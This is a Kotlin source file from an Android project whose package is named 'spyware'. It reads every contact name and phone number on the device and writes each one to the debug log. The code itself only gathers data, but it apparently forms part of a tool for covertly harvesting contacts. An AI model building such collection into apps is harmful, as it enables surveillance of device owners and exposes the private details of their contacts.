package com.mhl.spyware


import android.annotation.SuppressLint
import android.app.Application
import android.content.Context
import android.provider.ContactsContract
import android.util.Log
import android.widget.Toast

class ContactsRetriever(private val context: Context) {


    @SuppressLint("Range")
    fun getAllContacts(): List<Contact> {
        val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
        val projection = arrayOf(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )

        val sortOrder = "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
        val cursor = context.contentResolver.query(uri, projection, null, null, sortOrder)

        val contacts = mutableListOf<Contact>()

        cursor?.let {
            while (it.moveToNext()) {
                val contactName = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val contactPhoneNumber = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))

                contacts.add(Contact(contactName, contactPhoneNumber))

                Log.d("Contacts", "Name: $contactName, Phone: $contactPhoneNumber")
            }
            it.close()
        } ?: run {
            Log.d("Contacts", "No contacts found")

        }

        return contacts
    }
}

data class Contact(
    val name: String,
    val phoneNumber: String
)

